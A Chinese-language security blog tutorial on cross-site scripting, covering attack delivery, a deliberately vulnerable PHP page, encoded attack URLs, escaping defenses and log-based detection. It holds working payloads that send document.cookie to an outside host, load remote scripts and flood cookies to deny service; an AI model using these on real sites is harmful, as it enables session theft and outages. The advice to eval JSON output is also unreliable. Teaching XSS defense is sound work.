
### 关键字：XSS，跨站脚本攻击，原理分析，攻击方式，防范，检查，恶意代码，蠕虫

## 概念

以下概念摘抄自百度百科：
```
XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。
它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，
嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。
```
## 生效方式

### 构造URL

XSS攻击者通过构造URL的方式构造了一个有问题的页面；当其他人点击了此页面后，会发现页面出错，或者被暗中执行了某些js脚本，这时，攻击行为才真正生效。

一般来说，动态页面中会将url中的部分内容回写在页面中。以百度的搜索为例：
```
http://www.baidu.com/s?wd=<script>alert("wrong")<%2Fscript>
参数<script>alert("wrong")<%2Fscript>是<script>alert("wrong")</script>
```

转义后的结果，搜索结果页中，会在标题中中和搜索框中回写用户输入的内容。从页面的源代码中，我们看到，这两处本应该显示用户输入内容<script>alert("wrong")</script>的地方，实际也经过了转义处理，变成了<script>alert("wrong")</script>。

如果这里没有经过转义处理，则页面中就嵌入了一段script，会执行，并弹出对话框提示用户。如果是其他恶意代码，则可能造成破坏。

然后攻击者将此URL广为传播——比如说，以报错的方式发给百度的管理员，管理员打开这个URL就中招了。

### 发布内容式

构造URL攻击方式传播范围有限，被攻击者只要有基本的安全意识就可以避免，因此这种手段的危险性比较小。相比之下，通过发表内容构造的XSS的危害就大了很多。
在可以发表内容的论坛、讨论区、贴吧、博客、微博等网站上，用户发表的内容会保存起来，允许其他用户浏览。这些保存的内容显示在页面上的时候，如果没有经过正确的处理，也会把攻击者精心构造的内容显示出来，访问该内容的用户就此中招。如果该页面流传广泛，则影响会更加深远。
一般来说，这种攻击都做得比较隐蔽，被攻击者并不知道自己什么时候踩中了地雷；网站也很难追查问题的来源。

### 蠕虫式
上述两种方式的流传范围都有一定限度；最彻底最暴力的方式是使用蠕虫——就是首先发一个有问题的文章，浏览者阅读时会被暗中执行恶意代码，发表一篇新的文章的，该文章也含有同样的恶意代码。这样有可能在最快时间内将攻击铺满整个网站。蠕虫式攻击将暗中偷偷摸摸的攻击行为变成了光明正大的攻城拔寨，极容易被发现和修复。
下面是6月28日新浪微博被蠕虫攻击的报告，其实质就是XSS攻击。
http://www.ijinshan.com/news/20110629001.shtml

## 破坏方式

### 破坏页面结构
用户输入的内容包含了html的标签，与前面的标签等闭合，导致页面的DIV结构发生变化，页面错乱。

```
<div>测试</div>测试</div>
```
用户输入的内容包含了单引号或双引号，与前面的单引号或双引号匹配，导致后面的内容丢失，显示不出来。
```
<input id="name" value="这是" 用户输入的内容" type="text"></input>
```

一般来说，破坏页面结构导致页面故障的xss行为，一般是用户发表的内容无意中包含了特定的字符串，因此不具有直接的破坏作用，只会影响网站的声誉。

### 执行恶意代码
恶意代码有无限种，有代码执行的环境，就可以为所欲为。下面简单列几种：

#### 增加cookie，导致cookie总长度超过4K，服务器直接拒绝响应
```
<script>setcookie(key,value)</script>
```

#### 获取用户cookie,仿冒顾客身份登陆
```
<script>document.write('<img src="http://xxx.cn/b.gif?d="'+document.cookie+'/>')</script>
```

#### 嵌入一个js文件，那可做的事情就多了去了
```
<script src='http://xxx.cn/b.js'></script>
```
## 样例
xss_url.php文件的内容如下：
```
<?php
    session_start();
    $html = $_GET['html']?$_GET['html']:"html";
    $attr = $_GET['attr']?$_GET['attr']:"attr";
    $js   = $_GET['js']?$_GET['js']:"js";
?>
<html>
<head>
    <script type="text/javascript">
    var js = "<?php echo $js ?>";
    </script>
</head>
<body>
    <input type="text" value="<?php echo $attr; ?>"></input>
    <div><?php echo $html ?></div>
</body>
</html>
```
例子文件中有三个参数，分别是输出在js中的内容js，输出在html标签属性中的内容attr，输出在html标签内的内容html。
js中的内容难以过滤和转义，有很多种办法都可以嵌入一些可执行的js片断。因此是不安全的。

下面构造了几个URL，可以进行适度的攻击：
### 不停弹出对话框，恶心人
```
<script type="text/javascript">while(true){alert(document.cookie)}</script>A
http://182.18.24.130/test/xss_url.php?html=a%3Cscript+type%3D%22text%2Fjavascript%22%3Ewhile%28true%29{alert%28document.cookie%29}%3C%2Fscript%3EA
``` 
### 在页面中写一个图片文件，图片的URL参数就是当前用户的cookie
```
<script type="text/javascript">document.write('<img src="http://182.18.24.130/test/c.gif?a='+document.cookie+'"></img>')</script>A
http://182.18.24.130/test/xss_url.php?html=a%3Cscript+type%3D%22text%2Fjavascript%22%3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F182.18.24.130%2Ftest%2Fc.gif%3Fa%3D%27%2Bdocument.cookie%2B%27%22%3E%3C%2Fimg%3E%27%29%3C%2Fscript%3EA
 ```
### 恶意写入大量cookie，超出服务器上限，导致服务器拒绝响应
```
<script type="text/javascript">b='a';for(var i=0;i<1000;i++){b+=i};c=(new Date()).getTime();document.cookie='a'+c+'=b1000'+b </script>
http://182.18.24.130/test/xss_url.php?html=a%3Cscript+type%3D%22text%2Fjavascript%22%3Eb%3D%27a%27%3Bfor%28var+i%3D0%3Bi%3C1000%3Bi%2B%2B%29{b%2B%3Di}%3Bc%3D%28new+Date%28%29%29.getTime%28%29%3Bdocument.cookie%3D%27a%27%2Bc%2B%27%3Db1000%27%2Bb+%3C%2Fscript%3E
```

### 嵌入一个JS文件，则可以做得更多
```
<script type="text/javascript" src="http://182.18.24.130/test/a.js"></script>
http://182.18.24.130/test/xss_url.php?html=%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22http%3A%2F%2F182.18.24.130%2Ftest%2Fa.js%22%3E%3C%2Fscript%3E
```

## 防范

XSS攻击的模式很简单，就是把自己的代码嵌入到页面里，随页面一块执行；XSS攻击的防范也一样简单，就是对输出到页面上的内容中特定字符进行转义，使代码不能执行即可。针对出现在不同位置的用户输入内容，其处理策略有所不同。

### html
只需要处理掉< > 即可，只要没有html标签，页面就是安全的。
可以使用php内置方法htmlspecialchars来处理待输出的内容，将<,>,& 转义

### 属性
只需要处理掉< > ' " 即可
可以使用php内置方法htmlspecialchars来处理待输出的内容，将上述字符转义。

综合1）和2）两者需要处理的内容基本是一样的，而多转义并不会带来副作用，因此可以使用统一的处理方法
```
$out = htmlspecialchars($out,ENT_QUOTES)
```
注意第二个参数是明确要求将双引号进行转义。

### JS
将要输出到js代码片断中的用户输入内容没有好的办法进行处理；仅转义少数字符不能保证去掉所有的攻击可能。
因此，一般建议不要把用户产生的内容直接输出到js片断中。
如果条件所限，必须将内容直接输出，有如下方法可供选择：

- 如果待输出的内容有特定的取值返围或者特定的格式，可以使用白名单或者正则表达式进行处理。
- 可以将内容输出到html的隐藏标签或隐藏表单中，js通过获取标签的内容得到该内容。
- 使用json_encode将内容编码后输出到页面上，页面上使用eval将内容取出来。

## 检查
那么，对已有的页面，该如何检查呢？

这个问题的回答是，目前没有很好的办法能完全检查出可能存在xss攻击的页面；有一些办法可以检查出比较明显的疏漏，其基本思路如下：

1）从apache的access_log中取出所有unique的请求，依次修改其某一个参数为 "<script>alert('xx')</script>"，发起请求；

2）获取返回的内容，如果内容中有原样的该字符串，表明此可疑输入没有经过处理便输出到页面上，页面存在隐患，需要处理。

通过这种办法，可以检查出绝大多数能通过get请求发起的xss攻击。那些在access_log没有出现的请求参数，这里没有检查到，可能有所遗漏，就需要手动去整理，测试。

通过Post发起的请求需要用另外一种策略进行检查。其思路如下：

将网站上所有可以输入的表单，依次输入特征字符串，比如说<'">，如果提交后产生的页面中含有未处理的此字符串，说明存在隐患。

版权所有：《暗影技术博客》 => 《网络安全之跨站脚本攻击（XSS）的原理、防范和处理方法》
本文地址：http://www.ayblogs.com/?post=85
除非注明，文章均为 《暗影技术博客》 原创，欢迎转载！转载请注明本文地址，谢谢。